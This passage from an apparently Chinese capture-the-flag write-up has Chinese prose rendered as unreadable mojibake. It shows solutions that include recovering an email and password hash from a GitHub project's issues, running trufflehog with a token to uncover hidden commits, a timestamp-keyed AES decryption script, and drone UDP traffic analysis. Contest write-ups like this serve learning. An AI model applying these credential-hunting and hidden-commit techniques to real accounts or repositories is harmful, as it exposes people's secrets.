</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>sleep</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/img/2025-QWNT/37.png alt=img></p><p>æ‹¿åˆ°å¯†æ–‡æ˜¯</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Plain data-lang=Plain><span class=line><span class=cl>buiqhrvilHwigdClBuiTucduZnXmrLoHleieggbawsgsgcAyaFekhqWmAvqTocwhBuiiARfyurergyhNprwePcHcurmQsmGmqopirdhliaWpdRwIvhRphqgNproiBgGevBaRwfsyifiAlRvQpvglwfsemLQeBzswpnrkhbwmiAsXkcFjWvrXlLtuDbVsiRvyiqStWgcHwsxlLqqilrfCwfCmmqiWlPwhogSxuybMuvXmPncLbnrxPcGmitiWzgHbWhxXkcgfQtlxhQhxiakiUmtNprmvPcGmitiWecWhoeiegzMjWymxlaofwefyVgbyaFvmYyzmmGg
</span></span></code></pre></td></tr></table></div></div><p>ç”¨åœ¨çº¿ç½‘ç«™çˆ†ç ´å¯†é’¥</p><p><img src=/img/2025-QWNT/38.png alt=img></p><blockquote><p>flag{ineedyou}</p></blockquote><h1 id=misc>Misc</h1><h2 id=ciallo_encrypt>Ciallo_Encrypt</h2><p>æ—¥å¿—ä¸­base64è§£ç æ¢å¤å†…å®¹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>5qC45b+D5Luj56CB5oiR5bey5bCG5YW25pS+6L+b5LqGZm9ya+eahOengeS6uuS7k+W6k+mHjA<span class=o>==</span>
</span></span><span class=line><span class=cl>æ ¸å¿ƒä»£ç æˆ‘å·²å°†å…¶æ”¾è¿›äº†forkçš„ç§äººä»“åº“é‡Œ
</span></span></code></pre></td></tr></table></div></div><p>å»githubä¸ŠæŸ¥æ‰¾å¯¹åº”çš„é¡¹ç›®ï¼Œç»™å‡ºäº†appçš„åŸºæœ¬ä»£ç ï¼Œå»commitå‘ç°è´¦æˆ·å¯¹åº”çš„ç”¨æˆ·å’Œå¯†ç è¦æ±‚</p><p><img src=/img/2025-QWNT/39.png alt=img></p><p>åœ¨issueé‡Œæåˆ°äº†qqï¼Œç®€å•å¤„ç†å¾—åˆ°</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>3517508570@qq.com
</span></span><span class=line><span class=cl>f42e16b836b22e83fd3818b603c75dc6
</span></span></code></pre></td></tr></table></div></div><p>è¿›å»å‘ç°æœ‰ä¸ªå†å²å­˜æ¡£çš„ä¿¡æ¯ï¼Œéœ€è¦å°è¯•è§£å¯†ï¼Œæ ¹æ®ä¸€å¼€å§‹çš„æç¤ºï¼Œéœ€è¦çˆ†ç ´ä¸€ä¸‹éšè—çš„commitæ‹¿åˆ°åŠ å¯†çš„ä»£ç </p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>EXPORT <span class=nv>GITHUB_TOKEN</span><span class=o>=</span>ghp_Jk...
</span></span><span class=line><span class=cl>./trufflehog github-experimental --repo https://github.com/Yu2ul0ver/Ciallo_Encrypt0r.git --object-discovery
</span></span></code></pre></td></tr></table></div></div><p><img src=/img/2025-QWNT/40.png alt=img></p><p>éšæœºè®¿é—®ä¸€ä¸ªæ‹¿åˆ°åŠ å¯†é€»è¾‘</p><p><img src=/img/2025-QWNT/41.png alt=img></p><p>å¸¦ä¸Šå¯†æ–‡å’Œæ—¶é—´æˆ³ç»™aiå†™è§£å¯†è„šæœ¬</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.Padding</span> <span class=kn>import</span> <span class=n>unpad</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>ciallo_decrypt</span><span class=p>(</span><span class=n>encoded_text</span><span class=p>,</span> <span class=n>timestamp</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;æ—¶é—´æˆ³: </span><span class=si>{</span><span class=n>timestamp</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>patterns</span> <span class=o>=</span> <span class=n>encoded_text</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>binary</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>pattern</span> <span class=ow>in</span> <span class=n>patterns</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>pattern</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># åŸºå‡†æ¨¡æ¿: Cialloï½(âˆ ãƒ»Ï‰&lt;)âŒ’â˜…</span>
</span></span><span class=line><span class=cl>        <span class=n>bits</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;0&#39;</span><span class=p>]</span> <span class=o>*</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># bit[0]: pattern[1]==&#39;1&#39; -&gt; 1</span>
</span></span><span class=line><span class=cl>        <span class=n>bits</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;1&#39;</span> <span class=k>if</span> <span class=n>pattern</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;1&#39;</span> <span class=k>else</span> <span class=s1>&#39;0&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># bit[1]: pattern[2]==&#39;@&#39; -&gt; 0, å¦åˆ™ 1</span>
</span></span><span class=line><span class=cl>        <span class=n>bits</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;0&#39;</span> <span class=k>if</span> <span class=n>pattern</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;@&#39;</span> <span class=k>else</span> <span class=s1>&#39;1&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># bit[2]: pattern[3]==&#39;1&#39; -&gt; 1</span>
</span></span><span class=line><span class=cl>        <span class=n>bits</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;1&#39;</span> <span class=k>if</span> <span class=n>pattern</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;1&#39;</span> <span class=k>else</span> <span class=s1>&#39;0&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># bit[3]: pattern[4]==&#39;1&#39; -&gt; 1</span>
</span></span><span class=line><span class=cl>        <span class=n>bits</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;1&#39;</span> <span class=k>if</span> <span class=n>pattern</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;1&#39;</span> <span class=k>else</span> <span class=s1>&#39;0&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># bit[4]: pattern[5]==&#39;0&#39; -&gt; 0, å¦åˆ™ 1</span>
</span></span><span class=line><span class=cl>        <span class=n>bits</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;0&#39;</span> <span class=k>if</span> <span class=n>pattern</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;0&#39;</span> <span class=k>else</span> <span class=s1>&#39;1&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># bit[5]: pattern[6]==&#39;ä¸€&#39; -&gt; 1</span>
</span></span><span class=line><span class=cl>        <span class=n>bits</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;1&#39;</span> <span class=k>if</span> <span class=n>pattern</span><span class=p>[</span><span class=mi>6</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;ä¸€&#39;</span> <span class=k>else</span> <span class=s1>&#39;0&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># bit[6:8]: æ ¹æ®ä½ç½® 8,9,10 åˆ¤æ–­</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>pattern</span><span class=p>[</span><span class=mi>9</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;Â°&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>bits</span><span class=p>[</span><span class=mi>6</span><span class=p>],</span> <span class=n>bits</span><span class=p>[</span><span class=mi>7</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;0&#39;</span><span class=p>,</span> <span class=s1>&#39;0&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>pattern</span><span class=p>[</span><span class=mi>8</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;2&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>bits</span><span class=p>[</span><span class=mi>6</span><span class=p>],</span> <span class=n>bits</span><span class=p>[</span><span class=mi>7</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;1&#39;</span><span class=p>,</span> <span class=s1>&#39;0&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>pattern</span><span class=p>[</span><span class=mi>10</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;w&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>bits</span><span class=p>[</span><span class=mi>6</span><span class=p>],</span> <span class=n>bits</span><span class=p>[</span><span class=mi>7</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;1&#39;</span><span class=p>,</span> <span class=s1>&#39;1&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>bits</span><span class=p>[</span><span class=mi>6</span><span class=p>],</span> <span class=n>bits</span><span class=p>[</span><span class=mi>7</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;0&#39;</span><span class=p>,</span> <span class=s1>&#39;1&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>binary</span> <span class=o>+=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>bits</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;äºŒè¿›åˆ¶é•¿åº¦: </span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>binary</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># ç¬¬äºŒæ­¥ï¼šäºŒè¿›åˆ¶ -&gt; UTF-8 å­—èŠ‚</span>
</span></span><span class=line><span class=cl>    <span class=n>utf8_bytes</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>binary</span><span class=p>),</span> <span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>byte_str</span> <span class=o>=</span> <span class=n>binary</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span> <span class=o>+</span> <span class=mi>8</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>byte_str</span><span class=p>)</span> <span class=o>==</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>utf8_bytes</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>byte_str</span><span class=p>,</span> <span class=mi>2</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># ç¬¬ä¸‰æ­¥ï¼šUTF-8 è§£ç  -&gt; Base64</span>
</span></span><span class=line><span class=cl>    <span class=n>base64_str</span> <span class=o>=</span> <span class=n>utf8_bytes</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Base64: </span><span class=si>{</span><span class=n>base64_str</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># ç¬¬å››æ­¥ï¼šBase64 è§£ç  -&gt; AES å¯†æ–‡</span>
</span></span><span class=line><span class=cl>    <span class=n>ciphertext</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>base64_str</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;AES å¯†æ–‡é•¿åº¦: </span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>ciphertext</span><span class=p>)</span><span class=si>}</span><span class=s2> å­—èŠ‚&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># ç¬¬äº”æ­¥ï¼šç”Ÿæˆå¯†é’¥å¹¶ AES-ECB è§£å¯†</span>
</span></span><span class=line><span class=cl>    <span class=n>ts_str</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=n>timestamp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>key</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=n>ts_str</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;å¯†é’¥ (MD5 of &#39;</span><span class=si>{</span><span class=n>ts_str</span><span class=si>}</span><span class=s2>&#39;): </span><span class=si>{</span><span class=n>key</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_ECB</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>plaintext_padded</span> <span class=o>=</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>ciphertext</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>plaintext</span> <span class=o>=</span> <span class=n>unpad</span><span class=p>(</span><span class=n>plaintext_padded</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>block_size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>plaintext</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># å¯†æ–‡</span>
</span></span><span class=line><span class=cl><span class=n>ciphertext</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;Cia110ï½(âˆ ãƒ»Ï‰&lt;)âŒ’â˜… Ciall0ï½(âˆ ãƒ»w&lt;)âŒ’â˜… Cial10ï½(âˆ ãƒ»Ï‰&lt;)âŒ’â˜… Ciall0ï½(âˆ ãƒ»w&lt;)âŒ’â˜… Cial10ï½(2ãƒ»Ï‰&lt;)âŒ’â˜… Ci@110ï½(âˆ ãƒ»Ï‰&lt;)âŒ’â˜… Cia11oï½(âˆ ãƒ»Ï‰&lt;)âŒ’â˜… Ci@110ä¸€(âˆ ãƒ»Ï‰&lt;)âŒ’â˜… Cia11oï½(âˆ ãƒ»Ï‰&lt;)âŒ’â˜… Cial10ï½(âˆ ãƒ»Ï‰&lt;)âŒ’â˜… Cia11oï½(âˆ ãƒ»Ï‰&lt;)âŒ’â˜… Ciall0ï½(âˆ ãƒ»Ï‰&lt;)âŒ’â˜… Cia11oï½(âˆ Â°Ï‰&lt;)âŒ’â˜… Cial10ä¸€(âˆ ãƒ»w&lt;)âŒ’â˜… Ci@11oï½(âˆ ãƒ»Ï‰&lt;)âŒ’â˜… Cial1oï½(âˆ ãƒ»Ï‰&lt;)âŒ’â˜… Cial10ä¸€(âˆ Â°Ï‰&lt;)âŒ’â˜… Cia1l0ä¸€(âˆ ãƒ»Ï‰&lt;)âŒ’â˜… Cial1oï½(2ãƒ»Ï‰&lt;)âŒ’â˜… Cial10ï½(âˆ ãƒ»w&lt;)âŒ’â˜… Cialloä¸€(2ãƒ»Ï‰&lt;)âŒ’â˜… Cial1oï½(2ãƒ»Ï‰&lt;)âŒ’â˜… Cial10ï½(2ãƒ»Ï‰&lt;)âŒ’â˜… Cia110ï½(âˆ ãƒ»Ï‰&lt;)âŒ’â˜… Ciall0ï½(âˆ ãƒ»w&lt;)âŒ’â˜… Ci@110ï½(âˆ ãƒ»w&lt;)âŒ’â˜… Cia110ï½(2ãƒ»Ï‰&lt;)âŒ’â˜… Ci@11oï½(âˆ ãƒ»Ï‰&lt;)âŒ’â˜… Ciall0ä¸€(âˆ Â°Ï‰&lt;)âŒ’â˜… Cial10ï½(âˆ ãƒ»w&lt;)âŒ’â˜… Cialloä¸€(âˆ ãƒ»w&lt;)âŒ’â˜… Cial10ï½(âˆ ãƒ»w&lt;)âŒ’â˜… Ci@1loï½(âˆ ãƒ»w&lt;)âŒ’â˜… Cia1loä¸€(âˆ ãƒ»w&lt;)âŒ’â˜… Ci@110ï½(âˆ Â°Ï‰&lt;)âŒ’â˜… Cia110ï½(âˆ Â°Ï‰&lt;)âŒ’â˜… Ci@110ä¸€(âˆ Â°Ï‰&lt;)âŒ’â˜… Ci@110ä¸€(âˆ ãƒ»Ï‰&lt;)âŒ’â˜… Cial1oï½(âˆ ãƒ»Ï‰&lt;)âŒ’â˜… Cial10ä¸€(2ãƒ»Ï‰&lt;)âŒ’â˜… Cia11oï½(âˆ ãƒ»Ï‰&lt;)âŒ’â˜… Cia110ï½(âˆ ãƒ»Ï‰&lt;)âŒ’â˜… Ci@110ï½(2ãƒ»Ï‰&lt;)âŒ’â˜… Cia1l0ï½(2ãƒ»Ï‰&lt;)âŒ’â˜… Cia1loï½(2ãƒ»Ï‰&lt;)âŒ’â˜… Cia110ä¸€(2ãƒ»Ï‰&lt;)âŒ’â˜… Cialloï½(âˆ ãƒ»Ï‰&lt;)âŒ’â˜… Cia1loä¸€(âˆ Â°Ï‰&lt;)âŒ’â˜… Cialloï½(âˆ ãƒ»Ï‰&lt;)âŒ’â˜… Cial10ï½(2ãƒ»Ï‰&lt;)âŒ’â˜… Ciall0ï½(âˆ ãƒ»w&lt;)âŒ’â˜… Ciall0ï½(âˆ ãƒ»w&lt;)âŒ’â˜… Cia1l0ä¸€(âˆ Â°Ï‰&lt;)âŒ’â˜… Cia110ï½(âˆ ãƒ»w&lt;)âŒ’â˜… Cial10ä¸€(âˆ ãƒ»w&lt;)âŒ’â˜… Cia1l0ï½(âˆ ãƒ»Ï‰&lt;)âŒ’â˜… Cia1loï½(âˆ Â°Ï‰&lt;)âŒ’â˜… Cia110ä¸€(2ãƒ»Ï‰&lt;)âŒ’â˜… Cialloï½(âˆ ãƒ»Ï‰&lt;)âŒ’â˜… Ci@110ï½(2ãƒ»Ï‰&lt;)âŒ’â˜… Ci@110ä¸€(âˆ ãƒ»Ï‰&lt;)âŒ’â˜… Ci@1loï½(âˆ ãƒ»w&lt;)âŒ’â˜… Cia1l0ä¸€(âˆ Â°Ï‰&lt;)âŒ’â˜… Ciall0ï½(âˆ ãƒ»w&lt;)âŒ’â˜…&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># æ—¶é—´: 2025-10-16 02:27:33 (åŒ—äº¬æ—¶é—´)</span>
</span></span><span class=line><span class=cl><span class=c1># Unix æ—¶é—´æˆ³</span>
</span></span><span class=line><span class=cl><span class=n>timestamp</span> <span class=o>=</span> <span class=mi>1760552853</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>70</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;å¼€å§‹è§£å¯†...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>70</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>ciallo_decrypt</span><span class=p>(</span><span class=n>ciphertext</span><span class=p>,</span> <span class=n>timestamp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>70</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;âœ“ è§£å¯†æˆåŠŸ!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>70</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;æ˜æ–‡: </span><span class=si>{</span><span class=n>result</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>70</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;âœ— è§£å¯†å¤±è´¥: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=kn>import</span> <span class=nn>traceback</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>traceback</span><span class=o>.</span><span class=n>print_exc</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1>#flag{9f08699d-1b6c-471e-9ed0-86dbf3ee8074}</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=ä½ç©ºç»æµç½‘ç»œå®‰å…¨>ä½ç©ºç»æµç½‘ç»œå®‰å…¨</h1><h2 id=the-hidden-link>The Hidden Link</h2><p>å…¨æ˜¯udpçš„æµé‡ï¼Œwirksharkç®€å•çš„æ‰‹åŠ¨åˆ†æä¸€ä¸‹åœ¨</p><p><img src=/img/2025-QWNT/42.png alt=img></p><p>ç±»ä¼¼è¿™æ ·Båé¢æœ‰æ˜æ–‡ï¼Œä¸”åˆšå¥½èƒ½æ‹¼æˆæ­£å¸¸çš„flagçš„å†…å®¹ï¼Œæ‰‹åŠ¨è¡¥å¡«ä¸€ä¸‹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>...Bk3d<span class=o>}</span>.
</span></span><span class=line><span class=cl>...Bll3r.
</span></span><span class=line><span class=cl>...BflagJ
</span></span><span class=line><span class=cl>...B<span class=o>{</span>dr0.
</span></span><span class=line><span class=cl>...Bt_c0:
</span></span><span class=line><span class=cl>...Bntr0.
</span></span><span class=line><span class=cl>...B_h4c!
</span></span><span class=line><span class=cl>...Bn3_f 
</span></span><span class=line><span class=cl>...Bl1gh.
</span></span></code></pre></td></tr></table></div></div><p>æ˜¯ä¹±åºç®€å•çš„æ‹¼æ¥ä¸€ä¸‹å°±èƒ½å¾—åˆ°flag</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>flag<span class=o>{</span>dr0n3_fl1ght_c0ntr0ll3r_h4ck3d<span class=o>}</span>
